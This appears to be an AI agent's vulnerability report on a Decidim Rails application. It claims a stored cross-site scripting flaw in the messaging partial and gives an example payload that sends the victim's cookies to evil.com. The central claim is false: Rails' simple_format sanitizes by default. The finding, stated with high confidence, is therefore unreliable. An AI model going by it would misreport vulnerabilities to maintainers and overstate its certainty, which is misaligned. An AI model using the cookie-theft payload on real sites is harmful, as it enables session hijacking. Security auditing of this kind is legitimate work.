The workspace is a **Decidim** application (a participatory democracy framework built on Ruby on Rails). After extensive analysis of controllers, views, models, commands, forms, helpers, services, and uploaders across the main modules, I have identified a **Stored Cross-Site Scripting (XSS)** vulnerability.

**Vulnerability: Stored XSS in the Messaging/Conversations System**

- **Location**: `/work/decidim-core/app/views/decidim/messaging/conversations/_message.html.erb`, line 12
- **Vector**: `<%= simple_format(message.body) %>`
- **Details**: The `message.body` attribute is fully user-controlled (sent via the messaging/conversations feature). The `simple_format` Rails helper wraps text in `<p>` tags and marks the output `html_safe` **without escaping HTML entities**. No sanitization (`strip_tags`, `sanitize`, `decidim_sanitize`, or `html_escape`) is applied anywhere in the chain:
  - The `MessageForm` only validates `presence` of body — no sanitization.
  - The `ReplyToConversation` and `StartConversation` commands save the body as-is.
  - The `Message` model only validates `presence` and `length` — no sanitization.
  - The `_message.html.erb` partial calls `simple_format(message.body)` without any sanitization.
  - The AJAX endpoints (`create.js.erb`, `update.js.erb`) also call `.html_safe` on the rendered partial, confirming the XSS is exploitable via both page-load and AJAX paths.
- **Impact**: An attacker can send a message containing arbitrary HTML/JavaScript (e.g., `<script>document.location='https://evil.com/?c='+document.cookie</script>`), which will execute in the recipient's browser when viewing the conversation, leading to cookie theft, session hijacking, and other client-side attacks.

This is the most specific and confidently identified vulnerability. No other finding rises to the same level of certainty.
